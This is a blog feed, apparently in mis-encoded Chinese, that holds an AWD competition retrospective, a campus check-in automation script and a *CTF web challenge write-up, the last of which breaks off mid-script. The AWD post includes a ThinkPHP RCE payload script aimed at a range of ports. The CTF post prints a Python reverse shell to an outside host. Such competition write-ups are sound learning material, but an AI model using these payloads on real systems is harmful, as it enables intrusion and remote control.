    <content type="html"><![CDATA[<p>æœ€è¿‘æ‰“äº†ä¸€æ¬¡çº¿ä¸ŠAWDï¼Œç®—æ˜¯ç¬¬ä¸€æ¬¡æ­£å¼æ‰“AWD,è¡¨ç°ä¸å¤ªå¥½ï¼Œå‰æœŸçœ‹äº†ä¸€äº›AWDçš„æ€è·¯å’Œå¥—è·¯ï¼Œä½†æ˜¯æ²¡æœ‰çœŸæ­£åº”ç”¨äºå®é™…çš„AWDç¯å¢ƒä¸­ï¼Œéšåšä¸€æ¬¡è®°å½•ï¼Œè®°å½•è¿™é‡Œé¢å­˜åœ¨çš„é—®é¢˜ä»¥åŠæ²¡åšå¥½çš„åœ°æ–¹ã€‚</p><h1 id="å¼€èµ›"><a href="#å¼€èµ›" class="headerlink" title="å¼€èµ›"></a>å¼€èµ›</h1><p>å¼€å±€ç»™äº†sshå’ŒwebæœåŠ¡ä»¥åŠè¦æ±‚ï¼Œå¦‚æœè¢«check downäº†ï¼Œæ¯è½®æ‰£100åˆ†ï¼ˆå½“æ—¶ä¸çŸ¥é“æ¯è½®æ‰£100åˆ†ï¼Œä»¥ä¸ºä¸€å…±æ‰£100ï¼Œæ¯æ¬¡restartéœ€è¦æ‰£100å¹¶ä¸”é‡ç½®ç¯å¢ƒï¼Œæ‰€ä»¥å°±ä¸€ç›´æ²¡restartï¼‰</p><h1 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h1><p>æ‹¿åˆ°sshæƒé™åé¦–å…ˆå¤‡ä»½äº†æ–‡ä»¶ï¼Œç”¨Dç›¾ã€æ²³é©¬webshellä¸“æ€å·¥å…·å¯¹webç¯å¢ƒè¿›è¡Œæ€æ¯’ï¼Œæƒ³æŸ¥æ€webshellã€‚</p><p>åœ¨webshellæŸ¥æ€ç¯èŠ‚ä¸­ï¼Œä½¿ç”¨æ²³é©¬webshellä¸“æ€å·¥å…·å’ŒDç›¾æ€äº†ä¸€ä¸ªshellï¼Œä½†æ˜¯æœ‰å…æ€shellæ²¡æ€å‡ºæ¥ï¼ˆä¸€èˆ¬AWDä¼šå†…ç½®å¤šä¸ªåé—¨ï¼‰ï¼Œç”±äºæ—¶é—´åŸå› ä¹Ÿæ²¡æœ‰ç»†çœ‹ï¼Œé€ æˆçš„åæœæ˜¯è¢«ä¼ äº†ä¸æ­»é©¬ã€‚ï¼ˆè¿™æ˜¯åè¯äº†ã€‚</p><p>åœ¨webshellæŸ¥æ€ç¯èŠ‚ä¸­åº”æ”¹è¿›çš„åœ°æ–¹æ˜¯ï¼š</p><p>1.é‡‡ç”¨å¤šç§å·¥å…·ç»¼åˆæŸ¥æ€webshell</p><p>2.å¯¹ç–‘ä¼¼åé—¨æ–‡ä»¶æ‰‹å·¥æŸ¥çœ‹ï¼Œä¸èƒ½å®Œå…¨ç›¸ä¿¡å·¥å…·ã€‚</p><h3 id="å¼±ç‚¹1"><a href="#å¼±ç‚¹1" class="headerlink" title="å¼±ç‚¹1"></a>å¼±ç‚¹1</h3><p>æµé‡ç›‘æ§è„šæœ¬æ²¡æŒ‚ä¸Šå»ï¼Œå¯¼è‡´ç›‘æ§æµé‡å¤±è´¥ï¼Œæ— æ³•å¾—çŸ¥æœ‰å“ªäº›payloadæ˜¯å‘èµ·äº†æ”»å‡»ã€‚</p><h2 id="è‡ªæ£€"><a href="#è‡ªæ£€" class="headerlink" title="è‡ªæ£€"></a>è‡ªæ£€</h2><p>é€šè¿‡è§‚å¯ŸwebæœåŠ¡ä»¥åŠæŠ¥é”™é¡µé¢ï¼Œå‡ºç°äº†ç»å…¸çš„åå¹´ç£¨ä¸€å‰‘â€”-TP5.0.2ï¼Œäºæ˜¯ç«‹åˆ»æƒ³åˆ°äº†TP5.0.2çš„RCEã€‚</p><p>ç½‘ä¸Šæ”¶é›†payloadåæ‰“äº†ä¸€æ³¢cat/flagï¼ŒæˆåŠŸï¼Œå¹¶ä¸”é€šè¿‡è¯¥æ–¹å¼æ‹¿åˆ°äº†å…¶ä»–é˜Ÿä¼çš„flagï¼Œé‚è€ƒè™‘é‡‡ç”¨è„šæœ¬ç¼–å†™EXPæ‰¹é‡getflagå¹¶é€šçŸ¥è´Ÿè´£é˜²æŠ¤çš„é˜Ÿå‘˜ä¿®å¤ç›¸å…³æ¼æ´ã€‚</p><h3 id="å¼±ç‚¹2"><a href="#å¼±ç‚¹2" class="headerlink" title="å¼±ç‚¹2"></a>å¼±ç‚¹2</h3><p>åœ¨ä¿®å¤æ—¶æµªè´¹äº†å¤ªå¤šçš„æ—¶é—´ï¼Œè´Ÿè´£ä¿®å¤çš„é˜Ÿå‘˜æ— æ³•å°½å¿«ä¿®å¤ï¼Œå¹¶åœ¨ä¸Šä¼ ä¿®å¤åçš„æ–‡ä»¶æ—¶é‡åˆ°äº†æƒé™é—®é¢˜ã€‚</p><h3 id="å¼±ç‚¹3"><a href="#å¼±ç‚¹3" class="headerlink" title="å¼±ç‚¹3"></a>å¼±ç‚¹3</h3><p>ä¸´åœºç´§å¼ +payloadä¸ç†Ÿæ‚‰</p><p>æˆ‘çœŸçš„åäº†ã€‚å½“æ—¶å¤ªç´§å¼ äº†ï¼Œä¹‹å‰åˆ©ç”¨TP5çš„payloadä¹Ÿæ˜¯å¤åˆ¶ç²˜è´´ï¼Œè¿™ä¸¤ä¸ªå› ç´ åŠ èµ·æ¥å¯¼è‡´æˆ‘åœ¨Hackbarèƒ½é¡ºåˆ©æ‰“payloadï¼ŒBurpä¹Ÿå¯ä»¥ï¼Œä½†åˆ°äº†å†™è„šæœ¬çš„æ—¶å€™å°±ä¸è¡Œã€‚å› ä¸ºpayloadæ˜¯å››ä¸ªé”®å€¼å¯¹ï¼Œæˆ‘å†™è„šæœ¬çš„æ—¶å€™åªå†™äº†ä¸€ä¸ªã€‚</p><p>è´´ä¸€ä¸‹æˆ‘å½“æ—¶å†™çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://47.104.144.188:&quot;</span></span><br><span class="line">rest=<span class="string">&quot;/index.php?s=captcha&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27; _method&#x27;</span>:<span class="string">&#x27;__construct&amp;filter%5B%5D=system&amp;get%5B%5D=cat+%2Fflag&amp;method=get&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9001</span>,<span class="number">9051</span>):</span><br><span class="line">    urls=<span class="built_in">str</span>(url+<span class="built_in">str</span>(port)+rest)</span><br><span class="line">    response=requests.post(url=urls,data=data)</span><br><span class="line">    <span class="built_in">print</span> (response.text)</span><br></pre></td></tr></table></figure><h1 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h1><p>åœ¨æ‹¿åˆ°ä¸€ä¸ªå¹¶ä¸”å”¯ä¸€ä¸€ä¸ªpayloadåï¼Œç”±äºæ²¡æœ‰ç¼–å†™å‡ºæ‰¹é‡åˆ©ç”¨è„šæœ¬ï¼Œé‚è€ƒè™‘æ‰‹åŠ¨æ‰“ï¼Œå¯¼è‡´çš„å¾—åˆ†ç¼“æ…¢ã€‚</p><h3 id="å¼±ç‚¹4"><a href="#å¼±ç‚¹4" class="headerlink" title="å¼±ç‚¹4"></a>å¼±ç‚¹4</h3><p>ä¸´åœºè„šæœ¬ç¼–å†™èƒ½åŠ›æ¬ ç¼º</p><p>åœ¨ç¼–å†™è„šæœ¬çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦ç”¨åˆ°å¯¹htmlæ ‡ç­¾è§£æçš„åº“ï¼ˆå«å•¥å¿˜äº†ï¼‰ã€å¤šçº¿ç¨‹ï¼ˆæ‰¹é‡getflagå’Œæäº¤flagï¼‰ï¼Œä½†ç”±äºå¾ˆä¹…æ²¡å†™å¤šçº¿ç¨‹äº†ï¼Œæ‰€ä»¥å¿˜äº†å¤šçº¿ç¨‹å’‹ç”¨äº†ã€‚ã€‚è€Œä¸”è§£æhtmlæ ‡ç­¾è¿˜æ˜¯å¤§äºŒå­¦çˆ¬è™«çš„æ—¶å€™å†™çš„ï¼Œå¤ªè¿‡ä¹…è¿œï¼Œä¹Ÿæå¿˜è®°äº†ã€‚æ‰€ä»¥æœ€åè„šæœ¬ä¹Ÿæ²¡è·‘èµ·æ¥ï¼Œè€½è¯¯äº†å¤ªå¤šæ—¶é—´ã€‚</p><h3 id="å¼±ç‚¹5"><a href="#å¼±ç‚¹5" class="headerlink" title="å¼±ç‚¹5"></a>å¼±ç‚¹5</h3><p>å¯¹AWDèµ›åˆ¶ä¸ç†Ÿæ‚‰ï¼Œæœºå™¨è‡³å°‘downäº†ä¸‰åˆ†ä¹‹ä¸€çš„æ¯”èµ›æ—¶é—´ï¼Œ5åˆ†é’Ÿä¸€è½®ï¼Œä¸€è½®æ‰100åˆ†ã€‚æˆ‘è¯´æ€ä¹ˆè¶Šäº¤flagåˆ†è¶Šå°‘ã€‚ã€‚ç»äº†ã€‚</p><h1 id="åæ€ä¸æ”¹è¿›"><a href="#åæ€ä¸æ”¹è¿›" class="headerlink" title="åæ€ä¸æ”¹è¿›"></a>åæ€ä¸æ”¹è¿›</h1><h2 id="æå‡è„šæœ¬ç¼–å†™èƒ½åŠ›"><a href="#æå‡è„šæœ¬ç¼–å†™èƒ½åŠ›" class="headerlink" title="æå‡è„šæœ¬ç¼–å†™èƒ½åŠ›"></a>æå‡è„šæœ¬ç¼–å†™èƒ½åŠ›</h2><p>ä¸è¯´äº†ã€‚å¤šå†™å¤šçœ‹å¤šå¯»æ€ å¤šå€Ÿé‰´åˆ«äººçš„æ€è·¯ï¼ŒæŒæ¡åŸºæœ¬åº“çš„ç”¨æ³•ã€‚</p><p><strong>å…ˆæŠŠå¤šçº¿ç¨‹å’Œxpathè§£æå­¦ä¼šäº†ï¼ï¼ï¼</strong></p><h2 id="æå‡payloadç†Ÿç»ƒåº¦"><a href="#æå‡payloadç†Ÿç»ƒåº¦" class="headerlink" title="æå‡payloadç†Ÿç»ƒåº¦"></a>æå‡payloadç†Ÿç»ƒåº¦</h2><p>è¦æ±‚å¹³æ—¶å¤ç°è¿‡ç¨‹ä¸­ä¸èƒ½æ‹¿åˆ°ç›´æ¥æ‰“ï¼Œè¦åˆ†æåŸç†ä¸åˆ©ç”¨é“¾ã€‚</p><h2 id="æå‡è¿ç»´æ°´å¹³"><a href="#æå‡è¿ç»´æ°´å¹³" class="headerlink" title="æå‡è¿ç»´æ°´å¹³"></a>æå‡è¿ç»´æ°´å¹³</h2><p>èµ›å‰çœ‹åˆ°äº†å®‰æ’ä½æƒé™EDRï¼Œä½†æ˜¯éƒ¨ç½²èµ·æ¥çœ‹èµ·æ¥éº»çƒ¦ï¼Œå°±æ²¡æï¼Œä½†æ˜¯æµé‡ç›‘æ§è„šæœ¬ä¹Ÿæ²¡æŒ‚ä¸Šå»ï¼Œä»¥åéœ€è¦æå‰éƒ¨ç½²å¹¶å®è·µç›¸å…³è„šæœ¬ä¸ç¯å¢ƒã€‚</p><p>æ§åˆ¶å¥½ç›¸å…³æ–‡ä»¶çš„è¯»å†™æƒé™ç­‰ã€‚</p><h2 id="æå‡åº”æ€¥ååº”èƒ½åŠ›"><a href="#æå‡åº”æ€¥ååº”èƒ½åŠ›" class="headerlink" title="æå‡åº”æ€¥ååº”èƒ½åŠ›"></a>æå‡åº”æ€¥ååº”èƒ½åŠ›</h2><p>è¦é€šè¿‡æµé‡è„šæœ¬è§‚å¯Ÿæ˜¯å¦æœ‰å…¥ä¾µä¸æŒ‚é©¬è¡Œä¸ºï¼Œå­¦ä¼šå¦‚ä½•å¤„ç†ä¸æ­»é©¬ç­‰ç´§æ€¥æƒ…å†µã€‚</p><h2 id="æå‡ååˆ¶èƒ½åŠ›"><a href="#æå‡ååˆ¶èƒ½åŠ›" class="headerlink" title="æå‡ååˆ¶èƒ½åŠ›"></a>æå‡ååˆ¶èƒ½åŠ›</h2><p>è¦èƒ½é€šè¿‡åˆ«äººæ‰“çš„payloadåæ‰“åˆ«äºº</p><h2 id="å®Œå–„æ­¦å™¨åº“"><a href="#å®Œå–„æ­¦å™¨åº“" class="headerlink" title="å®Œå–„æ­¦å™¨åº“"></a>å®Œå–„æ­¦å™¨åº“</h2><p>å¤šæ”¶é›†webshellæŸ¥æ€å·¥å…·ã€ç§¯ç´¯webshellå…æ€æ–¹å¼ã€æ”¶é›†å¸¸è§æ¼æ´EXPã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ€è¿‘æ‰“äº†ä¸€æ¬¡çº¿ä¸ŠAWDï¼Œç®—æ˜¯ç¬¬ä¸€æ¬¡æ­£å¼æ‰“AWD,è¡¨ç°ä¸å¤ªå¥½ï¼Œå‰æœŸçœ‹äº†ä¸€äº›AWDçš„æ€è·¯å’Œå¥—è·¯ï¼Œä½†æ˜¯æ²¡æœ‰çœŸæ­£åº”ç”¨äºå®é™…çš„AWDç¯å¢ƒä¸­ï¼Œéšåšä¸€æ¬¡è®°å½•ï¼Œè®°å½•è¿™é‡Œé¢å­˜åœ¨çš„é—®é¢˜ä»¥åŠæ²¡åšå¥½çš„åœ°æ–¹ã€‚&lt;/p&gt;
&lt;h1 id=&quot;å¼€èµ›&quot;&gt;&lt;a href=&quot;#å¼€èµ›&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="awd" scheme="https://polosec.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°+å¾®ä¿¡æ¨é€</title>
    <link href="https://polosec.github.io/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/"/>
    <id>https://polosec.github.io/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/</id>
    <published>2021-01-19T14:11:27.000Z</published>
    <updated>2021-01-19T12:21:05.822Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°"><a href="#æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°" class="headerlink" title="æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°"></a>æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°</h1><p><a href="https://github.com/polosec/qfnuAutoTemperatureSubmit">https://github.com/polosec/qfnuAutoTemperatureSubmit</a></p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><p>é¦–å…ˆå®‰è£…ç¯å¢ƒä¾èµ– pip3 install requests</p><p>å°†è¯¥è„šæœ¬ä¸Šä¼ è‡³æœåŠ¡å™¨ ï¼ˆæˆ‘çš„è·¯å¾„æ˜¯/rootï¼‰</p><p>æ–°å»ºè„šæœ¬ auto.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /root/demo1.py xxxxx  xxxxxxx &gt;1.txt ; python3 /root/serverjiang.py </span><br></pre></td></tr></table></figure><p>æ–°å»ºå®šæ—¶ä»»åŠ¡</p><p>crontab -e  1 0 * * * /root/auto.sh  </p><p>æ¯å¤©å‡Œæ™¨0ç‚¹1åˆ†è‡ªåŠ¨æ‰§è¡Œ /root/auto.sh è¿™æ¡å‘½ä»¤</p><h1 id="ç»‘å®šserveré…±"><a href="#ç»‘å®šserveré…±" class="headerlink" title="ç»‘å®šserveré…±"></a>ç»‘å®šserveré…±</h1><p>åœ¨serveré…±ç»‘å®šå¾®ä¿¡åï¼Œæ‹¿åˆ°keyï¼Œæ”¾åˆ°ä¸‹é¢è„šæœ¬ <strong>yourkey</strong> è¿™ä¸ªåœ°æ–¹ã€‚</p><p>serverjiang.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://sc.ftqq.com/yourkey.send?text=&quot;</span></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>).readline()</span><br><span class="line">data=json.loads(data)</span><br><span class="line">data=data[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">text=<span class="built_in">str</span>(data)</span><br><span class="line">desp=<span class="string">&quot;success&quot;</span></span><br><span class="line">url=url+text+<span class="string">&quot;&amp;desp=&quot;</span>+desp</span><br><span class="line">r=requests.get(url=url).text</span><br></pre></td></tr></table></figure><h1 id="è¿è¡Œç»“æœ"><a href="#è¿è¡Œç»“æœ" class="headerlink" title="è¿è¡Œç»“æœ"></a>è¿è¡Œç»“æœ</h1><p>æ¯å¤©0ç‚¹1åˆ†è‡ªåŠ¨æäº¤ä½“æ¸©ä¸ŠæŠ¥è¯·æ±‚ï¼Œå¹¶ä¸”å°†è¿”å›çš„ä¿¡æ¯ï¼ˆæˆåŠŸ/é”™è¯¯ï¼‰</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°&quot;&gt;&lt;a href=&quot;#æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°&quot; class=&quot;headerlink&quot; title=&quot;æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°&quot;&gt;&lt;/a&gt;æ™ºæ…§æ›²å›­è‡ªåŠ¨ç­¾åˆ°&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/polosec/qfnuAutoTe</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XCTF/*CTF web4</title>
    <link href="https://polosec.github.io/2021/01/18/XCTF-CTF-web4/"/>
    <id>https://polosec.github.io/2021/01/18/XCTF-CTF-web4/</id>
    <published>2021-01-18T11:51:30.000Z</published>
    <updated>2021-01-18T12:26:01.085Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸Šå‘¨æœ«åˆšç»“æŸäº†*ctfçš„æ¯”èµ›ï¼Œåˆæ‘¸é±¼äº†ã€‚ã€‚èµ›åçœ‹é›ªå®çš„wpå¤ç°å‡ºæ¥çš„ï¼Œå‘ç°æ˜¯socketå†™çš„æœ‰ç‚¹é—®é¢˜ æåˆ°å¤œé‡Œä¸‰ç‚¹ä¹Ÿæ²¡æå‡ºæ¥ wtcl</p><h1 id="oh-my-socket"><a href="#oh-my-socket" class="headerlink" title="oh my socket"></a>oh my socket</h1><p>é¢˜ç›®åˆ†æï¼š</p><p>ç›´æ¥ç»™äº†ä¸€å †docker å…ˆè·‘èµ·æ¥çœ‹çœ‹æ˜¯ä»€ä¹ˆ</p><p>docker-compose up -d</p><p>è·‘èµ·æ¥äº†ä¸‰ä¸ªå®¹å™¨ åˆ†åˆ«æ˜¯ server client webserver</p><p>å…ˆæ•´ç†ä¸‹ç½‘ç»œç¯å¢ƒæƒ…å†µï¼š</p><p>webserver 172.21.0.4</p><p>server 172.21.0.2</p><p>client 172.21.0.3</p><p>é¦–å…ˆè®¿é—®webserver</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> STDOUT, check_output</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        f.save(os.path.join(f.filename))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            output = check_output([<span class="string">&#x27;python3&#x27;</span>, f.filename], stderr=STDOUT, timeout=<span class="number">80</span>)</span><br><span class="line">            content = output.decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            content = e.__str__()</span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;rm&#x27;</span>, f.filename]))</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(port=<span class="number">5000</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>é€šè¿‡å¯¹æºç è¿›è¡Œå®¡è®¡ å‘ç°ä¸Šä¼ æ–‡ä»¶åä¼šæ‰§è¡Œæ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼Œäºæ˜¯å°è¯•åå¼¹shellï¼Œä¸Šä¼ å¦‚ä¸‹è„šæœ¬ï¼š</p><p>è¿™é‡Œè¯·æ³¨æ„ç†è§£è¯¥æ®µä»£ç çš„ä½œç”¨ï¼Œå’Œbash -ié‚£ä¸ªçš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯å°†std out std in std erré‡å®šå‘è‡³socketã€‚</p><p>è¯¦ç»†çš„åˆ†æé“¾æ¥æ”¾åœ¨äº†æœ€åé¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os </span><br><span class="line"> </span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) </span><br><span class="line">s.connect((<span class="string">&quot;ip&quot;</span>,<span class="number">6666</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>) </span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>æœ¬åœ°ç›‘å¬æèµ·æ¥ï¼Œç„¶åä¸Šä¼ ï¼Œå¾—åˆ°åå¼¹è¿‡æ¥çš„shell</p><p>ä¸‹é¢å®¡è®¡server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;172.21.0.2&#x27;</span></span><br><span class="line">PORT = <span class="number">21587</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line"></span><br><span class="line">tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpSerSock.bind(ADDR)</span><br><span class="line">tcpSerSock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;waiting for connection...&#x27;</span>)</span><br><span class="line">    tcpCliSock, addr = tcpSerSock.accept()</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;...connnecting from:&#x27;</span>, addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&#x27;*ctf&#x27;</span>:</span><br><span class="line">                content = <span class="built_in">open</span>(<span class="string">&#x27;oh-some-funny-code&#x27;</span>).read()</span><br><span class="line">                tcpCliSock.send((content.encode()))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tcpCliSock.send((<span class="string">&#x27;[%s] %s&#x27;</span> % (ctime(), data)).encode())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cnt &gt;= <span class="number">2</span>:</span><br><span class="line">        time.sleep(<span class="number">120</span>)</span><br><span class="line">        tcpSerSock.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">tcpSerSock.close()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagçš„æ¡ä»¶æ˜¯å‘é€çš„æ•°æ®ä¸ºbâ€™*ctfâ€™</p><p>å‘ç°è¿™ä¸ªsocketå†™çš„æœ‰äº›é—®é¢˜ï¼Œè¿æ¥å¤§äº2æ—¶å°±æ–­å¼€äº†ï¼Œæ‰€ä»¥éœ€è¦å°è¯•è‡ªå·±å†™ä¸ªsocketè¿è¿›å»ï¼Œé˜²æ­¢åˆ«äººåœ¨è¿ï¼Œè¦ä¸€ç›´å¾ªç¯ã€‚</p><p>äºæ˜¯å¾—åˆ°å¦‚ä¸‹clientçš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">HOST=<span class="string">&#x27;172.25.0.2&#x27;</span></span><br><span class="line">PORT=<span class="number">21587</span></span><br><span class="line">BUFSIZ=<span class="number">1024</span></span><br><span class="line">ADDR=(HOST,PORT)</span><br><span class="line">tcpCliSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpCliSock.connect(ADDR)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data=<span class="string">b&#x27;*ctf&#x27;</span></span><br><span class="line"><span 